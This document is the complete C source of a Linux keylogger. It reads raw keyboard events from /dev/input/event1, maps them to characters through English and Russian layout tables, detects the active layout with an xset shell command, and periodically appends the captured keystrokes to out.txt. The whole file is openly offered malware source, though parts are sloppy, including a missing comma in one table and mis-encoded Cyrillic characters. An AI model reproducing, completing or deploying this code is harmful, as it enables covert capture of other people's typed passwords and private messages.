#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>
#include <fcntl.h>
#include <signal.h>
#include <time.h>
#include<stdio.h>
#include<string.h>
#include<stdlib.h>
#include<unistd.h> 
#define KEYLOGGER_H

#define KEYBOARD "/dev/input/event1"
#define UK ""
#define ESCAPE(key) (key == KEY_ESC)
#define SHIFT(key)  ((key == KEY_LEFTSHIFT) || (key == KEY_RIGHTSHIFT))
typedef void (*functionType)();

extern void keylogger_init (char *output_file);
extern void keylogger_exit (void);
extern void keylogger_run  (void);

static const char *keycodes_en[] =
{
    UK, UK, "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
    "-", "=", UK, "	", "q", "w", "e", "r", "t", "y", "u", "i",
    "o", "p", "[", "]", "\n", UK, "a", "s", "d", "f", "g", "h",
    "j", "k", "l", ";", "'", "`", UK, "\\", "z", "x", "c", "v", "b",
    "n", "m", ",", ".", "/", UK, "*", UK, " ", UK,
    UK, UK, UK, UK, UK, UK, UK, UK, UK, UK, UK,
    UK, "7", "8", "9", "-", "4", "5",
    "6", "+", "1", "2", "3",UK, UK, UK, UK, UK,
    UK, UK, UK, UK,	UK, UK,	UK, UK, UK, "\n", UK, "/",
    UK, UK, UK, UK, UK, UK, UK, UK, UK,
    UK,	UK, UK, UK, UK, UK, UK, UK,UK, UK, UK,
    UK
};
static const char *keycodes_ru[] =
{
    UK, UK, "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
    "-", "=", UK, "	", "é", "ö", "ó", "ê", "å", "í", "ã", "ø",
    "ù", "ç", "õ", "ú", "\n", UK, "ô", "û", "â", "à", "ï", "ð",
    "î", "ë", "ä", "æ", "ý", "¸", UK, "\\", "ÿ", "÷", "ñ", "ì", "è",
    "ò", "ü", "á", "þ", ".", UK, "*",UK, " ", UK,
    UK, UK, UK, UK, UK, UK, UK, UK, UK, UK, UK,
    UK, "7", "8", "9", "-", "4", "5",
    "6", "+", "1", "2", "3",UK, UK, UK, UK, UK,
    UK, UK, UK, UK,	UK, UK,	UK, UK, UK, "\n", UK, "/",
    UK, UK, UK, UK, UK, UK, UK, UK, UK,
    UK,	UK, UK, UK, UK, UK, UK, UK,UK, UK, UK,
    UK
};

static const char *shifted_keycodes_en[] =
{
    UK, UK, "!", "@", "#", "$", "%", "^", "&", "*", "(", ")",
    "_", "+", UK, "	", "Q", "W", "E", "R", "T", "Y", "U", "I",
    "O", "P", "{", "}", "\n", UK, "A", "S", "D", "F", "G", "H",
    "J", "K", "L", ":", "\"", "~", UK, "|", "Z", "X", "C", "V", "B",
    "N", "M", "<", ">", "?", UK, "*", UK, " ", UK,
    UK, UK, UK, UK, UK, UK, UK, UK, UK, UK, UK,
    UK, UK, UK, UK, "-", UK, UK,
    UK, "+", UK, UK, UK,UK, UK, UK, UK, UK,
    UK, UK, UK, UK,	UK, UK,	UK, UK, UK, "\n",UK, "/",
    UK, UK, UK, UK, UK, UK, UK, UK, UK,
    UK,	UK, UK, UK, UK, UK, UK, UK,UK, UK, UK,
    UK
};
static const char *shifted_keycodes_ru[] =
{
    UK UK, "!", "\"", "¹", ";", "%", ":", "&", "*", "(", ")",
    "_", "+", UK, "	", "É", "Ö", "Ó", "Ê", "Å", "Í", "Ã", "Ø",
    "Ù", "Ç", "Õ", "Ú", "\n", UK, "Ô", "Û", "Â", "À", "Ï", "Ð",
    "Î", "Ë", "Ä", "Æ", "Ý", "¨",UK, "/", "ß", "×", "Ñ", "Ì", "È",
    "Ò", "Ü", "Á", "Þ", ",", UK, "*", UK, " ", UK,
    UK, UK, UK, UK, UK, UK, UK, UK, UK, UK, UK,
    UK, UK, UK, UK, "-", UK, UK,
    UK, "+", UK, UK, UK,UK, UK, UK, UK, UK,
    UK, UK, UK, UK,	UK, UK,	UK, UK, UK, "\n",UK, "/",
    UK, UK, UK, UK, UK, UK, UK, UK, UK,
    UK,	UK, UK, UK, UK, UK, UK, UK,UK, UK, UK,
    UK
};


static int   running;
static int   keyboard_fd;
static char *output_file;
char buffer[2][12000];
int currentBuffer=0;
int currentLanguage=0;
long int curruntTime=0;
time_t rawtime;
struct tm * nowTime;
struct tm * lastWriteTime;
static void sig_handler(int signo)
{
    running = 0;
}

static void keylogger_usage(void)
{
    printf("\n"
            "Usage:\n"
            "     sudo ./keyloger \n"
            "\n");
    exit(EXIT_FAILURE);
}

void keylogger_init(char *ofile)
{
    signal(SIGINT, sig_handler);
    buffer[0][0]='\0';
    buffer[1][0]='\0';
    currentBuffer=0;
    running = 1;
    time ( &rawtime );
    lastWriteTime= localtime ( &rawtime );
    output_file = ofile;

    if ((keyboard_fd = open(KEYBOARD, O_RDONLY)) < 0) {
        fprintf(stderr, "\nUnable to read from the device\n");
        exit(EXIT_FAILURE);
    }
    changeLanguage();

}

void keylogger_exit(void)
{
    close(keyboard_fd);
}

void translateKeycode(char *result,int code,char isShifted)
{

    if( 0 == currentLanguage )
    {
        if( 1 == isShifted)
        {
             strcat(result,shifted_keycodes_en[code]);
            return;
        }
        strcat(result,keycodes_en[code]);
    }else
    {
        if( 1 == isShifted)
        {
             strcat(result,shifted_keycodes_ru[code]);
             return;
        }
        strcat(result,keycodes_ru[code]);
    }
}

void saveToFile(void)
{
FILE* file;
int loadedBuffer = currentBuffer;
currentBuffer = (loadedBuffer+1)%2;
 file = fopen("out.txt", "a");
 fprintf(file,"%s",buffer[loadedBuffer]);
 fflush(file);
 buffer[loadedBuffer][0]='\0';
 fclose(file);
}

void changeLanguage()
{
    FILE *file;
    system("xset -q|grep Group\\ 2|awk {'print $4'}|sed 's/on/Russian/g;s/off/English/g'>log.txt");
    file = fopen("log.txt", "r");
    char language[120]="";
    fscanf(file,"%s",language);
    if(strcmp(language,"English") == 0)
    {
        currentLanguage = 0;
    }else
    {
        currentLanguage =  1;
    }
    fflush(file);
    close(file);
}
void keylogger_run(void)
{

    int shift_flag = 0;
    struct input_event event;
    int timer = 0;
    while (running) {
        timer++;
        if( timer>20)
        {
            timer=0;
            saveToFile();
        }
        read(keyboard_fd, &event, sizeof(event));
        if (event.type == EV_KEY && event.value == 1) {
            if (ESCAPE(event.code))
                return;

            if (SHIFT(event.code))
            {
                shift_flag = event.code;
            }
            if (shift_flag ){
                if(event.code==56||keycodes_en[event.code]==100)
                {
                    changeLanguage();
                }
                if(!SHIFT(event.code))
                {
                    translateKeycode(buffer[currentBuffer],event.code,1);
                }
            }
            else if (!SHIFT(event.code))
                translateKeycode(buffer[currentBuffer],event.code,0);
        }
        else {
            if (event.type == EV_KEY && event.value == 0)
                if (SHIFT(event.code))
                    shift_flag = 0;
        }
    };
}

int main(int argc, char *argv[])
{
    keylogger_init(argv[1]);

    keylogger_run();

    keylogger_exit();

    return 0;
}
